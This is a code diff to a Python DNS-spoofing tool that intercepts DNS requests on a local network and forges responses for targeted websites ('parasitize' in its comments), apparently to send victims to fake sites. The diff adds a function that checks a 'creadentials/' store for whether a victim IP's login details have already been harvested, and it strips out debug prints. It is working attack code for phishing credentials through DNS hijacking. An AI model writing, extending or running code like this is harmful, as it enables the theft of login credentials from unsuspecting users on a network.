@@ -22,6 +22,22 @@ def dns_sorting_start(pkt):
         dns_check(WEBSITES, ATTACK_STATUS['dns'], network, pkt, src_ip, dst_ip)
 
 #
+# The function returns True if the credentials haven't been collected yet, False if they had.
+#
+def check_if_not_already_spoofed(ip, website):
+    path = ENV[nspoof_location]+"creadentials/"+website[0]
+    try : 
+        with open(path, 'r', encoding='utf-8') as cred_file:
+            content = cred_file.read()
+            if ip in content:
+                return False
+            else:
+                return True
+    except FileNotFoundError:
+        return True
+
+
+#
 # Function checking if the DNS request is part of the one we want to parasitize (checking IP_adress, the domain and website concerned).
 #
 def dns_check(websites, dns, network, pkt, src_ip, dst_ip):
@@ -34,11 +50,8 @@ def dns_check(websites, dns, network, pkt, src_ip, dst_ip):
 
         if website: #if there is a corresponding website in out data
 
-            if src_ip not in website[4]: #if we didn't already colelcted the information for this IP on this website
+            if check_if_not_already_spoofed(src_ip, website): #if we didn't already collected the information for this IP on this website
                 if pkt[DNS].qd.qtype == 1:
-                    #print('-----------------------------------------------------------------------', flush=True)
-                    #print("CREATE DNS RESPONSE , " + str(pkt[DNS][DNSQR].qname.decode('utf-8')) + ", " + str(pkt[DNS].qd.qtype) + " FROM " + str(pkt[Ether].src) + " TO " + str(pkt[Ether].dst), flush=True)
-                    #print('-----------------------------------------------------------------------', flush=True)
                     create_dns_response(website, dns, network, pkt, src_ip, dst_ip, domain_name)        
                     return
                 else:
@@ -46,14 +59,8 @@ def dns_check(websites, dns, network, pkt, src_ip, dst_ip):
             else:
                 forward_dns(pkt,dst_ip) #if something is wrong, it will forward the package
         else:
-            #print('-----------------------------------------------------------------------', flush=True)
-            #print("FORWARD 1 , " + str(pkt[DNS][DNSQR].qname.decode('utf-8')) + ", " + str(pkt[DNS].qd.qtype) + " FROM " + str(pkt[Ether].src) + " TO " + str(pkt[Ether].dst), flush=True)
-            #print('-----------------------------------------------------------------------', flush=True)
             forward_dns(pkt,dst_ip) #if something is wrong, it will forward the package
     else:
-        #print('-----------------------------------------------------------------------', flush=True)
-        #print("FORWARD 2, " + str(pkt[DNS][DNSQR].qname.decode('utf-8')) + ", " + str(pkt[DNS].qd.qtype) + " FROM " + str(pkt[Ether].src) + " TO " + str(pkt[Ether].dst), flush=True)
-        #print('-----------------------------------------------------------------------', flush=True)
         forward_dns(pkt,dst_ip) #if something is wrong, it will forward the package
 
 #
